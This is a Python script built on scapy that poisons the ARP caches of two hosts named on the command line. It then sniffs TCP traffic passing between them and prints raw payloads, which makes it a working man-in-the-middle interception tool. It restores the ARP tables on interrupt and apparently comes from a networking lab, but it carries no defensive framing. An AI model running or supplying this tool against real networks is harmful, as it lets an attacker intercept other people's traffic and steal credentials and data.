
from scapy.all import Ether, ARP, srp, send, sniff, TCP
import argparse
import time
import os
import sys
import signal
import re

def parse_arguments():
    parser = argparse.ArgumentParser(description="ARP spoofing and traffic sniffing between a server and a client")                 
    parser.add_argument("addr", nargs='*')
    arg = parser.parse_args()
    if is_valid_ipv4_address(arg.addr[0]) and is_valid_mac_address(arg.addr[1]) and \
        is_valid_ipv4_address(arg.addr[2]) and is_valid_mac_address(arg.addr[3]) and \
        arg.addr[0] != arg.addr[2] and arg.addr[1] != arg.addr[3] and \
        len(arg.addr) == 4:
        return arg
    else:
        print(f"[x] Usage: <IPv4-src> <MAC-src> <IPv4-target> <MAC-target>")
        exit(1)

def is_valid_ipv4_address(ip_address):
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ipv4_pattern, ip_address):
        return True
    return False

def is_valid_mac_address(mac_address):
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    if re.match(mac_pattern, mac_address):
        return True
    return False

def spoof(ip_target, ip_src, verbose=True):
    """
    Spoofs `ip_target` saying that we are `ip_src`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    arp_response = ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        mac_self = ARP().hwsrc
        print(f"[+] Sent to {ip_target} : {ip_src} is-at {mac_self}")

def restore(ip_target, ip_src, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `ip_src` ) to `ip_target`
    """
    arp_response = ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print(f"[+] Sent to {ip_target} : {ip_src} is-at {mac_src}")

def handle_interrupt(signal, frame):
    print("[!] Detected CTRL+C ! restoring the network, please wait...")
    restore(ip_target, ip_src)
    restore(ip_src, ip_target)
    exit(0)

signal.signal(signal.SIGINT, handle_interrupt)

if __name__ == "__main__":
    args = parse_arguments()

    ip_src = args.addr[0] 
    mac_src = args.addr[1] 

    ip_target = args.addr[2] 
    mac_target = args.addr[3] 
    verbose = True
    try:
            spoof(ip_target, ip_src, verbose)
            spoof(ip_src, ip_target, verbose)
            time.sleep(1)
            while True:
                sniff(filter="tcp", prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%:}{Raw:%Raw.load%}"))
    except KeyboardInterrupt:
        handle_interrupt(None, None)